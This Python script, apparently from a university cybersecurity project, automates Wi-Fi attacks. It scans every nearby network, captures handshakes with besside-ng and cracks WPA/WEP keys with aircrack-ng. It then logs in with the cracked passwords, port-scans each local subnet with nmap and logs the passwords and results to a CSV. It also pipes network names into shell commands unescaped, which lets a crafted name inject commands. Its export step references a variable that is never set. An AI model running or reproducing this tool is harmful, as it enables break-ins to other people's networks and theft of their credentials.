#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  SSI_ver.py
#  autors: L&M (Lello Molinario e Massimo Putzu)
#  Copyright 2021  <pi@raspberrypi>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.#  

# Importo le librerie necessarie
from gps import *
import time
import subprocess
import wifi
import csv
import sys
import os



#Definisco una classe per i colori del testo
class c_testo:
    v = '\u001b[92m' #VERDE
    g = '\033[93m' #GIALLO
    r = '\033[91m' #ROSSO
    b = '\033[34m' #BLU
    reset = '\033[0m' #RESET

#Definosco una funzione di logo per abbellire il programma
# A function is defined that creates a logo
def logo ():
    print(c_testo.v + "\t\t  _   _      _                      _")
    print("\t\t  | \\ | |    | |                    | |")
    print("\t\t  |  \\| | ___| |___      _____  _ __| | __")
    print("\t\t  | . ` |/ _ \\ __\\ \\ /\\ / / _ \\| '__| |/ /")
    print("\t\t  | |\\  |  __/ |_ \\ V  V / (_) | |  |   <")
    print("\t\t  |_| \\_|\\___|\\__| \\_/\\_/ \\___/|_|  |_|\\_\\")
    print("\t\t   / ____|                    (_) |")
    print("\t\t  | (___   ___  ___ _   _ _ __ _| |_ _   _")
    print("\t\t   \\___ \\ / _ \\/ __| | | | '__| | __| | | |")
    print("\t\t   ____) |  __/ (__| |_| | |  | | |_| |_| |")
    print("\t\t  |_____/ \\___|\\___|\\__,_|_|  |_|\\__|\\__, |")
    print("\t\t  |  __ \\         (_)         | |     __/ |")
    print("\t\t  | |__) | __ ___  _  ___  ___| |_   |___/")
    print("\t\t  |  ___/ '__/ _ \\| |/ _ \\/ __| __|")
    print("\t\t  | |   | | | (_) | |  __/ (__| |_")
    print("\t\t  |_|   |_|  \\___/| |\\___|\\___|\\__|")
    print("\t\t                 _/ |")
    print("\t\t                |__/                       " + c_testo.reset)

    print(
        c_testo.r + "\nAuthors:\nLello Molinario (matr.70/90/00369)\nFederico Moro (matr.70/90/00380)" + c_testo.reset)
    print(
        "Master's degree in Computer Engineering, Cybersecurity and Artificial Intelligence - University of Cagliari")
    print(c_testo.b + "Supervisor: Prof. Marco Martalò\n" + c_testo.reset)

from gps import *   
def avvio_gps ():
    try:
        #avviamo i processi ed i monitor del GPS
        subprocess.call(["sudo", "gpsd", "/dev/ttyACM0", "-F", "/var/run/gpsd.sock", "-n"]) 
        print ("Avvio lettura dati dal modulo GPS.\nAttendere prego...")
        coordinate=[]
        while len (coordinate)==0:
            letture_gps = gps(mode=WATCH_ENABLE|WATCH_NEWSTYLE) # avviamo lo  stream dei dati
            t_fine = time.time() +  15
            while time.time() < t_fine:
                Latidutine=(letture_gps.fix.latitude)
                Longitudine =(letture_gps.fix.longitude)
                coordinate=[Latidutine,Longitudine]
                prossimo_dati = letture_gps.next()
                    
    
        coord=str(Latidutine)+","+str(Longitudine)
        url=("https://www.google.com/maps/search/?api=1&query="+coord)
        
        print (c_testo.v + "Le coordinate rilevate sono:\nLatidutine:", Latidutine, "\nLongitudine:", Longitudine,  c_testo.reset)
        print ("Le coordinate GPS sono raggiungibili all'URL:",c_testo.v, url,c_testo.reset)
        
    except:
        print("Il segnale GPS non è stabile e/o raggiungibile.\nSi prega si posizionare meglio l'antenna.")
        sys.exit(1)

    return [Latidutine,Longitudine,url]

           
#definiamo la funzione per la scansione delle WIFI e ritorna le reti presenti          
def scan_wifi ():
    wifilist = [[]]
    while len (wifilist[0])==0 or (wifilist[0])== None:
        wifilist = [[cell.ssid for cell in wifi.Cell.all('wlan0')],
                    [cell.quality for cell in wifi.Cell.all('wlan0')],
                    [cell.encryption_type for cell in wifi.Cell.all('wlan0')],
                    [cell.channel for cell in wifi.Cell.all('wlan0')],
                    [cell.address for cell in wifi.Cell.all('wlan0')],
                    [cell.mode for cell in wifi.Cell.all('wlan0')]]
    print (c_testo.v,"\n\t\t\t\tNumero di reti trovate:",len (wifilist[0]), c_testo.reset)
    print ("----------------------------------------------------------------------------------------------------------------")
    print ("---------------------------------RETI WIFI DISPONIBILI------_---------------------------------------------------")
    print (" SSID\t\t\tQUALITA\'\tCRITTOGRAFIA\tCANALE\t\tINDIRIZZO\t\t\tMODALITA\'")
    for i in range (len(wifilist[0])):
        print(c_testo.r, wifilist[0][i], "\t\t\t"+str(wifilist[1][i]), "\t\t"+str(wifilist[2][i]), "\t\t"+str(wifilist[3][i]), "\t\t"+str(wifilist[4][i]), "\t\t"+str(wifilist[5][i]) ,c_testo.reset)
        
    return (wifilist)


#Definisco una funzione che riceve la reti trovare, cattura i pacchetti e prova a recuperare la password 
def hack_wifi(wifilist):
    
    # da qui inizio la funzione AIRMON-NG
    psw=[]
    try:
        for i in range (len(wifilist[0])):
            if  i==0:
                if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa") and ((wifilist [3][i]) in range (12)) :
                    print("\nProvo a trovare la cattura i pacchetti della wi-fi",(wifilist [0][i])," con crittografia", (wifilist [2][i]),"sul canale",(str(wifilist [3][i])), "\nAttendere prego....\n")
                    try:
                        subprocess.call (["sudo","-s", "besside-ng", "-v","-W","-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                        print("\nProvo a trovare la password della wi-fi",(wifilist [0][i]),"con crittofrafia", (wifilist [2][i]), "\nAttendere prego....\n")
                        time.sleep(5)
                    except:
                        print("Errore al monitor mode della scheda di rete.\nIl programma verrà terminato")
                    
                    wifi_txt=(str(wifilist [0][i])).replace(" ","_")
                    
                    subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" -w ./password.lst ./wpa.cap>"+str(wifi_txt+".txt"),shell=True)
                    with open (((wifi_txt)+".txt"), "r") as aprifile:
                        for x in aprifile:
                            y=x.find("KEY FOUND!")
                            if y>1:
                                a=x.split()
                        print ("\nLa password della rete wifi",wifilist [0][i],"è:", a[3])
                        psw.append (a[3])

                elif ((str(wifilist [2][i])) == "wep") and ((wifilist [3][i]) in range (12)):
                    print("\nProvo a trovare la cattura i pacchetti della wi-fi",(wifilist [0][i])," con crittografia", (wifilist [2][i]),"sul canale",(str(wifilist [3][i])), "\nAttendere prego....\n")
                    try:
                        subprocess.call (["sudo","-s","besside-ng", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                        print("\nProvo a trovare la password della wi-fi",(wifilist [0][i]),"con crittofrafia", (wifilist [2][i]), "\nAttendere prego....\n")
                        time.sleep(5)
                    except:
                        print("Errore al monitor mode della scheda di rete.\nIl programma verrà terminato")
                    
                    wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                    
                    subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" ./wep.cap>"+str(wifi_txt1+".txt"),shell=True)
                    with open (((wifi_txt1)+".txt"), "r") as aprifile:
                        for x in aprifile:
                            y=x.find("KEY FOUND!")
                            if y>1:
                                a=x.split()
                        print ("\nLa password della rete wifi",wifilist [0][i],"è:", a[6])
                        psw.append (a[6])
                     

                elif (str(wifilist [2][i])) == "None":
                    wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                    print ("\nLa rete wifi",wifilist [0][i],"è libera!!!\n")
                    psw.append ("")
                
                
                elif ((wifilist [3][i]) > 12):
                    print ("\nLa rete wifi",wifilist [0][i], "ha una frequenza fuori portata.\nMi spiace ma non è possibile attaccarla!!!\n")
                    psw.append ("")
                    
                else:
                    print("\nCifratura  ancora non supportata...")
    #                 sys.exit(1)
            else:
                if (((wifilist [0][i])) != ((wifilist [0][i-1])) and ((wifilist [3][i])) != ((wifilist [3][i-1]))):
                    if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa") and ((wifilist [3][i]) in range (12)) :
                        print("\nProvo a trovare la cattura i pacchetti della wi-fi",(wifilist [0][i])," con crittografia", (wifilist [2][i]),"sul canale",(str(wifilist [3][i])), "\nAttendere prego....\n")
                        try:
                            subprocess.call (["sudo","-s", "besside-ng", "-v","-W", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                            print("\nProvo a trovare la password della wi-fi",(wifilist [0][i]),"con crittofrafia", (wifilist [2][i]), "\nAttendere prego....\n")
                            time.sleep(5)
                        except:
                            print("Errore al monitor mode della scheda di rete.\nIl programma verrà terminato")
                        
                        wifi_txt=(str(wifilist [0][i])).replace(" ","_")
                        
                        subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" -w ./password.lst ./wpa.cap>"+str(wifi_txt+".txt"),shell=True)
                        with open (((wifi_txt)+".txt"), "r") as aprifile:
                            for x in aprifile:
                                y=x.find("KEY FOUND!")
                                if y>1:
                                    a=x.split()
                            print ("\nLa password della rete wifi",wifilist [0][i],"è:", a[3])
                            psw.append (a[3])

                    elif ((str(wifilist [2][i])) == "wep") and ((wifilist [3][i]) in range (12)):
                        print("\nProvo a trovare la cattura i pacchetti della wi-fi",(wifilist [0][i])," con crittografia", (wifilist [2][i]),"sul canale",(str(wifilist [3][i])), "\nAttendere prego....\n")
                        try:
                            subprocess.call (["sudo","-s","besside-ng", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                            print("\nProvo a trovare la password della wi-fi",(wifilist [0][i]),"con crittofrafia", (wifilist [2][i]), "\nAttendere prego....\n")
                            time.sleep(5)
                        except:
                            print("Errore al monitor mode della scheda di rete.\nIl programma verrà terminato")
                        
                        wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                        
                        subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" ./wep.cap>"+str(wifi_txt1+".txt"),shell=True)
                        with open (((wifi_txt1)+".txt"), "r") as aprifile:
                            for x in aprifile:
                                y=x.find("KEY FOUND!")
                                if y>1:
                                    a=x.split()
                            print ("\nLa password della rete wifi",wifilist [0][i],"è:", a[6])
                            psw.append (a[6])
                         

                    elif (str(wifilist [2][i])) == "None":
                        wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                        print ("\nLa rete wifi",wifilist [0][i],"è libera!!!\n")
                        psw.append ("")
                    
                    
                    elif ((wifilist [3][i]) > 12):
                        print ("\nLa rete wifi",wifilist [0][i], " ha una frequenza fuori portata.\nMi spiace ma non è possibile attaccarla!!!\n")
                        psw.append ("")
                        
                    else:
                        print("\nCifratura  ancora non supportata...")
                else:
#                    print("Rete con gli stessi parametri già scansionata")
                    pos=len(psw)-1
                    psw.append(psw[pos])
 
                    

    except:
        print("E' stato eccepito un problema all'Hardaware di rete.\nSi prega di riavviare il S.O.")

    wifilist.append (psw)
    return (wifilist)


#Mi collego alla rete e scansiono le sue vulberabilità
def wifiIP (wifilist):
    ip_completo=[]
    vulnerabilità=[]
    for i in range (len(wifilist[0])):
             
        ip=[]
        
        try:
            if  i==0:
                if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa"or (str(wifilist [2][i])) == "wep" ):
                    print("\nOra che abbiamo ottenuto la password alla rete",(wifilist [0][i]), "proviamo a connetterci....\n") 
                    subprocess.call (["sudo","nmcli", "device", "wifi", "connect",(wifilist [0][i]), "password", str(wifilist [6][i])])
                    a=subprocess.run(["hostname","-I"], capture_output= True)
                    uscita=str(a.stdout)
                    punto ="."
                    li_fr= uscita.split(punto)
                    q=list(li_fr[0])
                    g=q[2:]
                    x=(li_fr[3])
                    spazio =" "
                    y=x.split(spazio)
                    nulla =""
                    elem=nulla.join(g)
                    ip.append(elem)
                    ip.append(li_fr[1])
                    ip.append(li_fr[2])
                    ip.append(y[0])
                    ip=punto.join(ip)
                    ip_completo.append (ip)
                    #iniziamo la scansione nmap
                    ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                    print ("\nConnessione alla rete", (wifilist [0][i]), "avvenuta con successo.\nIl numero ip assegnato dall'Access Point è",ip_completo[i])            
                    print ("\nInizio la scansione delle vulnerabilità tramite \"Nmap Vulscan\"....\nAttendere prego...\n")            
    #                scansione con vulscan...molto lunga in caso di molti utenti connessi
    #                 vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
    #               scansione con nmap normale:
                    vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                    vulnerabilità.append (vulner)
                    
                    # arrestiamo eventuali connessioni sulle delle schede di rete
                    try:
                        subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                    except:
                        print("La scheda di rete Wlan0 non è stata utilizzata nel processo, per cui non ha bisogno di essere disattivata") 
#                     try:
#                         subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan1"])
#                     except:
#                         print("La scheda di rete wlan1 non è stata utilizzata nel processo, per cui non ha bisogno di essere disattivata") 
                    time.sleep (5)
                   
                else:         
                    subprocess.call (["sudo","nmcli",  "device", "wifi", "connect",(wifilist [0][i])])
                    a=subprocess.run(["hostname","-I"], capture_output= True)
                    uscita=str(a.stdout)
                    punto ="."
                    li_fr= uscita.split(punto)
                    q=list(li_fr[0])
                    g=q[2:]
                    x=(li_fr[3])
                    spazio =" "
                    y=x.split(spazio)
                    nulla =""
                    elem=nulla.join(g)
                    ip.append(elem)
                    ip.append(li_fr[1])
                    ip.append(li_fr[2])
                    ip.append(y[0])
                    ip=punto.join(ip)
                    ip_completo.append (ip)
                    #iniziamo la scansione nmap
                    ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                    print ("\nConnessione alla rete", (wifilist [0][i]), "avvenuta con successo.\nIl numero ip assegnato dall'Access Point è",ip_completo[i])            
                    print ("\nInizio la scansione delle vulnerabilità tramite \"Nmap Vulscan\"....\nAttendere prego...\n")            
                   
    #                 vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
    #                 scansione con nmap normale:
                    vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                    vulnerabilità.append (vulner)
                              
                    # arrestiamo eventuali connessioni sulle delle schede di rete
                    try:
                        subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                    except:
                        print("La scheda di rete Wlan0 non è stata utilizzata nel processo, per cui non ha bisogno di essere disattivata")
                    
                    time.sleep (5)
            else:
                if (((wifilist [0][i])) != ((wifilist [0][i-1])) and ((wifilist [3][i])) != ((wifilist [3][i-1]))):
                    if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa"or (str(wifilist [2][i])) == "wep" ):
                        print("\nOra che abbiamo ottenuto la password alla rete",(wifilist [0][i]), "proviamo a connetterci....\n") 
                        subprocess.call (["sudo","nmcli", "device", "wifi", "connect",(wifilist [0][i]), "password", str(wifilist [6][i])])
                        a=subprocess.run(["hostname","-I"], capture_output= True)
                        uscita=str(a.stdout)
                        punto ="."
                        li_fr= uscita.split(punto)
                        q=list(li_fr[0])
                        g=q[2:]
                        x=(li_fr[3])
                        spazio =" "
                        y=x.split(spazio)
                        nulla =""
                        elem=nulla.join(g)
                        ip.append(elem)
                        ip.append(li_fr[1])
                        ip.append(li_fr[2])
                        ip.append(y[0])
                        ip=punto.join(ip)
                        ip_completo.append (ip)
                        #iniziamo la scansione nmap
                        ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                        print ("\nConnessione alla rete", (wifilist [0][i]), "avvenuta con successo.\nIl numero ip assegnato dall'Access Point è",ip_completo[i])            
                        print ("\nInizio la scansione delle vulnerabilità tramite \"Nmap Vulscan\"....\nAttendere prego...\n")            
        #                scansione con vulscan...molto lunga in caso di molti utenti connessi
        #                 vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
        #               scansione con nmap normale:
                        vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                        vulnerabilità.append (vulner)
                        
                        # arrestiamo eventuali connessioni sulle delle schede di rete
                        try:
                            subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                        except:
                            print("La scheda di rete Wlan0 non è stata utilizzata nel processo, per cui non ha bisogno di essere disattivata") 
 
                        time.sleep (5)
                       
                    else:         
                        subprocess.call (["sudo","nmcli",  "device", "wifi", "connect",(wifilist [0][i])])
                        a=subprocess.run(["hostname","-I"], capture_output= True)
                        uscita=str(a.stdout)
                        punto ="."
                        li_fr= uscita.split(punto)
                        q=list(li_fr[0])
                        g=q[2:]
                        x=(li_fr[3])
                        spazio =" "
                        y=x.split(spazio)
                        nulla =""
                        elem=nulla.join(g)
                        ip.append(elem)
                        ip.append(li_fr[1])
                        ip.append(li_fr[2])
                        ip.append(y[0])
                        ip=punto.join(ip)
                        ip_completo.append (ip)
                        #iniziamo la scansione nmap
                        ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                        print ("\nConnessione alla rete", (wifilist [0][i]), "avvenuta con successo.\nIl numero ip assegnato dall'Access Point è",ip_completo[i])            
                        print ("\nInizio la scansione delle vulnerabilità tramite \"Nmap Vulscan\"....\nAttendere prego...\n")            
                       
        #                 vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
        #                 scansione con nmap normale:
                        vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                        vulnerabilità.append (vulner)
                                  
                        # arrestiamo eventuali connessioni sulle delle schede di rete
                        try:
                            subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                        except:
                            print("La scheda di rete Wlan0 non è stata utilizzata nel processo, per cui non ha bisogno di essere disattivata") 
                        time.sleep (5)
                else:
#                     print("Rete",(wifilist [0][i-1])" ha gli stessi parametri della precedente già scansionata.\n")
                    pos=len(ip_completo)-1
                    ip_completo.append (ip_completo[pos])
                    vulnerabilità.append (vulnerabilità[pos])

         
        except:
            print("La connessione Wi-Fi si è persa....\n")
            ip_completo.append (None)
            vulnerabilità.append (None)
           

    wifilist.append (ip_completo)
    wifilist.append (vulnerabilità)
        
    return (wifilist)
    

#Definisco una funzione esportare i dati ricavi in un apposito file csv
def export_csv (coordinate,listawifi):
    
    url=(coordinate[2])
    latidutine=(coordinate[0])
    longitudine=(coordinate[1])

    conteggio_wifi=len (listawifi[0])
    
    data=time.strftime("%d/%m/%Y")
    ora= time.strftime("%H:%M:%S")
    
    ssid= listawifi [0]
    quality = listawifi [1]
    encryption_type=listawifi [2]
    channel=listawifi [3]
    address=listawifi [4]
    mode=listawifi [5]
    password=listawifi [6]
    ip=listawifi [7]
    vuln=listawifi [8]
        
    if os.path.isfile ("wifi.csv") == False:
        print("Non esiste un file \'wifi.cvs\' su cui esportare i dati.")
        print("Provvedo a generarlo.\n"+c_testo.g+"Attendere prego..."+c_testo.reset)
        with open('wifi.csv', 'w', newline='') as csvfile:
            fieldnames = ["Data", "Ora", 'Latidutine', 'Longitudine', 'SSID', 'Qualità', "Crittografia", "Canale", "Indirizzo", "Modalità", "Password", "Ip", "Vulnerabilità", "URL"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            i=0
            while i<conteggio_wifi:
                writer.writerow({ "Data": data, "Ora": ora, 'Latidutine': latidutine, 'Longitudine':longitudine,'SSID': ssid [i],'Qualità': quality [i],
                                  "Crittografia" : encryption_type [i], "Canale": channel [i],
                                  "Indirizzo": address [i], "Modalità": mode [i], "Password":password [i],
                                  "Ip":ip[i], "Vulnerabilità": vuln[i], "URL": url})
                i=i+1 
        print (c_testo.v+"Esportazione dati su file \'wifi.cvs\' avvenuta con successo")    
    
    
    else:
        print("Esiste già un file \'wifi.cvs\' su cui esportare i dati.\nProvvedo ad accodare i dati."+c_testo.g+"\nAttendere prego..."+c_testo.reset)
        with open('wifi.csv', 'a', newline='') as csvfile:
            fieldnames = ["Data", "Ora", 'Latidutine', 'Longitudine', 'SSID', 'Qualità', "Crittografia", "Canale", "Indirizzo", "Modalità", "Password", "Ip", "Vulnerabilità", "URL"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            i=0
            while i<conteggio_wifi:
                writer.writerow({ "Data": data, "Ora": ora, 'Latidutine': latidutine, 'Longitudine':longitudine,'SSID': ssid [i],'Qualità': quality [i],
                                  "Crittografia" : encryption_type [i], "Canale": channel [i],
                                  "Indirizzo": address [i], "Modalità": mode [i], "Password":password [i],
                                  "Ip":ip[i], "Vulnerabilità": vuln[i], "URL": url})
                i=i+1
        print (c_testo.v+"Esportazione dati su file \'wifi.cvs\' avvenuta con successo"+c_testo.reset)
    return (listawifi)


def main():
#     Avvio logo
    logo()
#     Avvio ricerca coordinate funzionante 
    #coordinate=avvio_gps ()
#     
#     Avvio scansione wifi tramite wlan0 (schede di rete della raspberry) meno potente per evitare di prendere reti non mie
    listawifi= scan_wifi ()
#     Hack delle wifi tramite wlan1 (schede di rete monitor) funzionante
    listawifi=hack_wifi(listawifi)
#     Scansione vulnerabilità 
    listawifi=wifiIP (listawifi)
#     Esportazione dei dati
    listawifi=export_csv (coordinate, listawifi)
    print (listawifi)
    return 0
    
    
if __name__ == "__main__":
    main()
